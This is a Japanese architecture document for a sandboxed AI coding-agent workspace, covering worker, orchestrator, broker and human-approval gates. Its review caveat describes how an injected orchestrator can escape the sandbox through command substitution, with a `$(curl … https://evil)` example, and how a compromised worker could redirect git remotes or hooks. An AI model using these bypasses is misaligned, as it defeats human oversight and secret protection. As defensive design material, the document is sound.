# Architecture

## このワークスペースが解決する問題

1つのチケットは通常いくつものリポジトリにまたがり、エージェントによるコーディングには
相反する2つのものが必要になる: **自由**(コマンドごとの確認プロンプトが無い)と
**封じ込め**(push 無し、exfiltration 無し、認証情報の読み取り無し)。このワークス
ペースはこの矛盾を、コマンド単位ではなく*役割*単位の OS レベル sandbox で解決する:
危険なことを OS が不可能にするからこそ、エージェントはプロンプトゼロの自律性を得る。

> 🇬🇧 English: [architecture.md](architecture.md)

## レイヤ

4つのセキュリティ面。それぞれが独自の `.claude/settings.json` と、コスト按分のための
OTEL `workspace=` ラベルを持つ:

| # | レイヤ | CWD | OTEL ラベル | 作成元 |
|---|---|---|---|---|
| A | Root / management console | repo ルート | `ROOT` | /setup-workspace |
| C | Origins | `repositories/` | `REPOSITORIES` | /setup-workspace |
| D | Worker(タスクごと) | `tasks/<T>/agents/worker/` | `<T>,purpose=<p>` | /open-task |
| E | Orchestrator(タスクごと) | `tasks/<T>/agents/orchestrator/` | `<T>,purpose=<p>` | /open-task |

(この設計の v2 起源では5つ目のレイヤ、独立した `orchestrators/task-manager` の
management console があったが、ここでは意図的に Root に統合してある — リポジトリ自体が
コンソール。Worker と orchestrator は1つの OTEL ラベルを共有する。役割はコストデータ
上では分離できない。)

- **Root** は management スキルを実行する。読み取り専用の bash はプロンプト無しで
  ホワイトリスト、変更操作はプロンプトする。clone/PR 用に GitHub ネットワーク。
  `repositories/**` は編集不可(ツールレベルの deny)。
- **Origins** は worktree のソース。誰も編集しない。変更はすべてタスク worktree で
  起きる。これらはワークスペース repo によって gitignore される(repo がコミットするのは
  `config/repos.json` — clone ではなく*リスト*だけ)。
- **Worker** が作業を行う。[settings-reference/worker.md](settings-reference/worker.md) を参照。
- **Orchestrator** が worker に指令する。汎用 bash は一切無し — そのシェル面はきっかり
  allowlist された5つのスクリプトだけ。
  [settings-reference/orchestrator.md](settings-reference/orchestrator.md) を参照。

## タスクごとの構造

```
tasks/<TICKET>/
├── CLAUDE.md                    task overview (generated from templates)
├── docs/
│   ├── task.md                  full ticket body — the worker's source of truth
│   └── handoff/                 append-only agent message log (see handoff-protocol.md)
├── repositories/<repo>/         git worktrees, branch <branch_prefix><TICKET>
├── scripts/push-create-pr.sh    the only path to publishing (denyWrite for agents)
└── agents/
    ├── worker/                  CWD of tab-1 Claude; contains .git (empty file)
    │   ├── CLAUDE.md  initial-prompt.md  .claude/settings.json  [.mcp.json]
    └── orchestrator/            CWD of tab-3 Claude; contains .git (empty file)
        ├── CLAUDE.md  initial-prompt.md  .claude/settings.json  [.mcp.json]
        └── .claude/skills/      send / read / wait / add-repository + .worker-target
```

各エージェントディレクトリの空の `.git` **ファイル**は、Claude Code がワークスペース
リポジトリまで上に辿るのを止める — 各エージェントはクリーンな、repo でない CWD を見る。
`tasks/` は丸ごと gitignore されるので、これがワークスペース repo 自身の git と衝突する
ことは決してない。

### clone ではなく worktree

`repositories/<repo>` は一度だけ clone する。タスクワークスペースは
`git worktree add ../../tasks/<T>/repositories/<repo>` を得る — ディスクコストほぼゼロ、
オブジェクトストア共有、使い捨て。ツールに焼き込まれたルール:

- ターゲットパスは**相対**なので、ワークスペースを移動しても worktree リンクは生き残る。
- worktree の作成は**直接の `git -C` コマンド**として走る(open-task スキルから、または
  sandbox 除外スクリプトから) — sandbox されたスクリプトの中に埋め込むことは決してない。
  `worktree add` が本質的に sandbox でブロックされるからではなく(そうではない — これは
  `.git/worktrees/` に書くだけ、S8-c で検証済み。sandbox で決して走れないのは
  `git init`/`clone` の方、S8-a/f)、*root コンソールの* sandbox が origins をカバーする
  allowWrite を持たず、しかも同じステップは通常どのみち `git fetch`(ネットワーク)を
  必要とするからだ。
- `type: knowledge` の repo は **sparse checkout**(`--cone`)を得る。`config/repos.json`
  の `sparse_paths.<purpose>` にスコープされる。`/setup-workspace` はすべての origin に
  `extensions.worktreeConfig=true` を設定し、worktree ごとの sparse 状態が機能するように
  する。
- Worker のコミットには**origin `.git` への書き込み権限は不要** — git の worktree ハンドリ
  ングが共有 `.git` に自力で到達する(S8-d で検証済み。Claude Code ≥ 2.1.149 が必要)。
  代わりに /open-task はタスク repo ごとに **denyWrite ピン**を注入する: origin
  `.git/config`、`.git/hooks`、および worktree の `config.worktree` — 侵害された worker が
  `remote.origin.url` / `core.hooksPath` を張り替えるのに使うリダイレクト面(C-2 レビュー
  の指摘)。deny ピンは `settings.local.json` からの permission ルールのドリフト
  (「二度と尋ねない」の承認)も生き残る — S2-n で検証済み: local の allow ルールは OS の
  書き込み境界を広げ、それに勝てる唯一のものが project の denyWrite だ。

## cmux: チケットごとに3タブ

/open-task は `<TICKET>` という名前の cmux ワークスペースを作成する:

| タブ | 名前 | 実行内容 |
|---|---|---|
| 1 | Worker Claude | `agents/worker/` で `claude --permission-mode acceptEdits "<initial prompt>"` |
| 2 | Terminal | タスクルートでの素のシェル — 人間のレーン(インストール、docker) |
| 3 | Orchestrator Claude | `agents/orchestrator/` で `claude "<initial prompt>"` |

Worker の面**UUID**は作成時に
`agents/orchestrator/.claude/skills/.worker-target` にピン留めされる。UUID はフォーカス
変更やタブの並べ替えを生き残り、orchestrator はそのファイルを書き換えられず(denyWrite)、
メッセージングスクリプトは `--workspace`/`--surface` の上書きを拒否する — だから
orchestrator は、実行時プロンプトが何を伝えようとしても、自分自身の worker にしか指令
できない。

cmux が無い場合、/open-task は手動の起動コマンドを表示(しコピー)する。システムは
シングルセッション利用に劣化する。

### コマンドループ

```
orchestrator                           worker
    │  send-command.sh "<instruction>"     │
    ├──────────────────────────────────────▶  works: edit/build/test/commit
    │  wait-for-worker.sh (background)     │
    │           ...                        │  appends docs/handoff/..._worker.md
    │  RESULT status=idle ◀────────────────┤  goes idle (never exits)
    │  Read newest handoff file            │
    │  handle requests (push/PR, escalate) │
    │  append ..._orchestrator.md result   │
    └── next instruction ──────────────────▶
```

`wait-for-worker` は見えている画面(Claude Code の「esc to interrupt」インジケータ)から
worker の状態を導出し、デバウンスする。単一の `RESULT` 行を出力するので、orchestrator が
ビジーポーリングすることはない。

## 権限境界のまとめ

| アクション | Worker | Orchestrator | Root | Human(Tab 2) |
|---|---|---|---|---|
| タスク worktree のコード編集 | ✅ | ❌ | ❌ | (可能だが、すべきでない) |
| ローカル build / lint / test | ✅ | ❌ | ❌ | ✅ |
| git commit(タスク repo) | ✅ | ❌ | ❌ | ✅ |
| git push / PR | ❌ | ✅ push-create-pr.sh 経由 | ✅ 同スクリプト経由 | ✅ |
| パッケージ / docker のインストール | ❌ | ❌ | prompt | ✅ |
| sandbox を広げる | ❌ | ❌ | ✅ /update-task-sandbox | — |
| 外部ネットワーク | ❌ | ❌ | github/npm のみ | ✅ |
| `~/.ssh`、`~/.aws`、gh/gcloud 認証情報の読み取り | ❌ | ❌ | ❌ | ✅ |

push 先はさらに `.githooks/pre-push` によって
`config/workspace.json: allowed_push_orgs` に制限される。これは `core.hooksPath` +
`~/.gitconfig` の includeIf(/setup-workspace がインストール)によって、ワークスペース
配下のすべての repo と worktree に適用される。

**留意点 — orchestrator は半信頼にすぎない(レビュー C-3)。** その5つの特権スクリプトは
sandbox の `excludedCommands` 経由で走り、これはコマンドライン全体を sandbox から逃がす。
permission 層はオペレータチェーン(`;`/`&&`/`|`、`Bash(*)` が無いので)を捕まえるが、
コマンド置換 `$(...)` の中は見えない(P4-c)。そのため
`--body "$(curl … https://evil)"` のような引数は sandbox 外で実行される。したがって注入
された orchestrator は任意のホストコマンドを走らせることができ、その役割については push
allowlist と秘密保護を無効化する。Worker — より注入されやすい役割 — は完全に閉じ込め
られたままだが、orchestrator はそうではない。これを完全に塞ぐには、スクリプトを除外する
のではなく、スコープされた egress とともに sandbox の中で走らせる必要がある(push が
なお機能することの実行時検証が必要)。
[settings-reference/orchestrator.md](settings-reference/orchestrator.md) を参照。

## コンテナ化された実行フロー(Phase 0–3 + M1–M3、live 検証済み)

コンテナ経路は macOS サンドボックスを Linux のネットワーク名前空間境界で置き換える。
Phase 0–3 はこのフローを coder コンテナ1つで実証し、その後 M1–M3
([agent-orchestration.md](agent-orchestration.md))がその coder を orchestrator +
worker のペアに分割し、判断をコード化された状態機械からレールの上を走る LLM
セッションへ移した。すべてが実機で稼働済み — 実行記録は
[devcontainer-status.md](devcontainer-status.md) の項目5–7を参照。誰が何をやり、
各境界を何が越えるのかを1枚にまとめる:

```
[worker コンテナ — tasks/ のみ rw、harness/repositories は :ro、broker ソケットなし]
  workerd RPC デーモン(harness/src/workerd/)— 改行区切り JSON の unix ソケット1本
  ├─ setup_worktree … repo を clone/sparse checkout
  ├─ run_implement / run_fix … 編集可能な LLM セッション、指示ごとに1つ
  └─ run_tests … 機械の判定(exit code === 0 のみ。モデルの主張は不採用)
  すべてのステップは**決定論的**なコミット(`mrw:` プレフィックス)で終わる —
  worktree は常にクリーン。worker は publish を依頼することすらできない
  (broker ソケットなし)
        ▲ 型付きの request/response、改行区切り JSON       │ egress-proxy
        │ unix ソケット越し(workerd プロトコル)             (Squid allowlist)
        │                                                    経由で api.anthropic.com のみ
[orchestrator コンテナ — ワークスペース全体 :ro、broker + worker ソケットを保持]
  coded spine(harness/src/spine/)— 不変条件台帳 + 型付きアクション executor
  ├─ orchestrator LLM セッション … in-process MCP ツール(run_worker /
  │  run_tests / review_diff / plan_repo / ask_human / show_human /
  │  request_publish / done / abort)経由で、一度に1つ型付きアクションを提案
  ├─ PLAN / REVIEW … 読み取り専用の LLM セッション。`:ro` のワークスペース
  │  マウントを読む
  ├─ commitRangeDiff(baseSha, HEAD) … どのステップも見る diff は*これだけ*
  │  (gitops.ts、git オブジェクトの純粋な読み取り — worker が既に決定論的に
  │  コミット済みなので `:ro` 上でも動く)
  ├─ 台帳ゲート: request_publish は plan + tests-green + review-approved の
  │  すべてが**現在の HEAD sha**を証明しているときだけ発火
  ├─ 人間ゲート(spine が所有する唯一のターミナル越し — `npm run chat`。または
  │  同じプリミティブに乗る従来の `npm run orchestrate`/`npm run drive` フロー)
  └─ publish の INTENT を unix ソケットで送信 ──▶ [broker コンテナ — egress ネットワーク]
                                                    ├─ GROUND TRUTH を自前で再導出
                                                    │  (diff/URL/sha を git オブジェクト
                                                    │   と焼き込み policy から。coder の
                                                    │   言葉は決して信用しない)
                                                    ├─ 任意の助言コンサルト ──▶ [reviewer
                                                    │  (diff を渡し verdict を  コンテナ —
                                                    │  受け取る。予算120秒。    write:none、
                                                    │  三値: OFF /             broker からの
                                                    │  no-verdict / verdict)   入力のみ]
                                                    ├─ policy 検証(host/org/branch)
                                                    ├─ 人間ゲート(sha をタイプ)— ground
                                                    │  truth diff と reviewer の verdict
                                                    │  の両方を見る
                                                    └─ push + gh pr create
        型付き応答(sha/PR、または約20種の ─────────┘   (トークンの唯一の保持者)
        fail-closed な失敗コードのいずれか)
orchestrator は応答を読んで後続を判断する
(マルチリポジトリドライバ: 台帳を更新し、次のリポジトリへ進むか停止する)
```

このフローを信頼できるものにしている3つの区別:

1. **チェックの担い手は3種類。** diff の REVIEW は独立した LLM(助言であり、決して
   決定者ではない)— orchestrator 内の REVIEW ステップと broker 側 reviewer の
   両方。TEST GATE は機械(exit code のみ)。人間ゲート(orchestrator の対話 +
   broker の sha タイプゲート)は人間。人間の接点は最小だが、決定権はすべて
   人間にある。
2. **broker は coder の言うことに基づいて動かない。** intent は型付きの*願望*
   (`{repo, branch, title, body}`)にすぎず、重要なものすべて — 人間が承認する diff、
   push 先 URL、sha — はトラスト側で git オブジェクトと焼き込み policy から再導出される。
   broker 側 reviewer が見るのもこの再導出された ground truth だけであり、worker
   自身の言葉は決して見ない。
3. **すべての失敗は「publish されていない」を意味する。** broker の応答は型付きで、
   ok 以外のコード(declined、dirty_worktree、sha_changed、…)はすべて fail-closed。
   だから orchestrator はその上に安全にシーケンス制御を組める。

単一コンテナ fallback は残っている。単なる歴史的経緯ではなく本質的なもの:
`WORKERD_SOCKET` が未設定なら、効果を持つすべてのステップ(`exec.ts` のモード
切替)は RPC ではなく in-process で走るが、同じプリミティブ、同じ決定論的
コミット / `commitRangeDiff` の意味論を使う — だから上の分離トポロジと元の
Phase 0–3 の単一 coder 経路は、2つのコードベースではなく1つである。

## 設定モデル

組織がカスタマイズするものはすべて `config/` と `templates/` にあり、実行時に生成される
ものはすべて gitignore される。プレースホルダ(`{{WORKSPACE_ROOT}}`、`{{TASK_DIR}}`、
`{{TASK_DIR_H}}`、`{{TICKET_ID}}`、…)は**実行時にのみ**置換される — 絶対パスがコミット
されることは決してない。`{{TASK_DIR_H}}` は `~/` を起点とした形で、パスが sandbox の
`excludedCommands` エントリとバイト一致しなければならない箇所で使われる。

各タスクは恒久メタデータを `tasks/<T>/.task-meta.json`(ticket、purpose、dev_kind、branch、
repos、sandbox)に持ち、finalize が書き込み、add-repository が同期を保つ。これは一時的な
`.workspace-meta.json`(cmux フェーズの後に削除される)より長く残り、`/list-task` と
add-repository が **purpose** を読む先である — OTEL env-var スクレイプは、それが存在する
より前に作られたタスクのためのフォールバックとしてのみ残っている。(`/list-task` は今も
repo リストをディスク上の worktree ディレクトリから導出する。`repos` フィールドは来歴と
将来の利用のために記録される。)

Purpose はプラグイン形式のファイルだ: `config/purposes/foo.json`(加えて任意で
`templates/purposes/foo/` のオーバーライド)を置けば purpose が追加される。他に変える
ものは何も無い。テンプレート解決順序:
`templates/purposes/<p>/kinds/<k>/<file>` → `templates/purposes/<p>/<file>` →
`templates/default/<file>`。

## v2 プラグインからの既知の差分(意図的)

- Trust のセットアップはエージェント起動**より前**に起きる(open-task のフェーズは
  init → finalize → trust → cmux)。だから worker の初回起動は `permissions.allow` を
  尊重する。
- Purpose の `default_repos` / `mcp_servers` はスクリプト(`--yes`)経路でも適用される。
  対話時だけではない。
- `--preset` フラグ無し、エリアベースの sandbox 合成無し、purpose ごとの `.mcp.json`
  テンプレート無し — v2 のドキュメントはこれらを記述していたが、動作するコードは決して
  実装しなかった。この repo は動く挙動に標準化する。
- Worker と orchestrator の間の MCP ツールレベルの read/write 分割は v1 では実装され
  ていない。両エージェントは purpose のサーバリストを得る(worker のアクセスは必要なら
  templates/default/mcp.json でサーバごとに絞るべき)。
- 引き継がれていない(まだの)v2 スキル: `update-task-purpose`(代わりにタスクを close
  して再度開く)、`sync-workspace-settings`(/setup-workspace を再実行 — 冪等)、
  `open-code`、`cmux-diff-viewer`(`cmux diff` がネイティブコマンドとして存在する)。
- Multi-worker アーキタイプ(coder / reader / researcher / documenter を `.worker-targets`
  マップと spawn-worker スキルで)は planned extension。単一の `.worker-target` +
  名前ごとの `agents/<name>/` レイアウトは、その拡張が追加的であるように選ばれた。具体的な
  役割の分類(境界マトリクス、役割別 egress、不変条件)は
  [agent-roles.md](agent-roles.md) で設計されている。ディスパッチ/`.worker-targets` の
  設計は [agent-dispatch.md](agent-dispatch.md) にある。
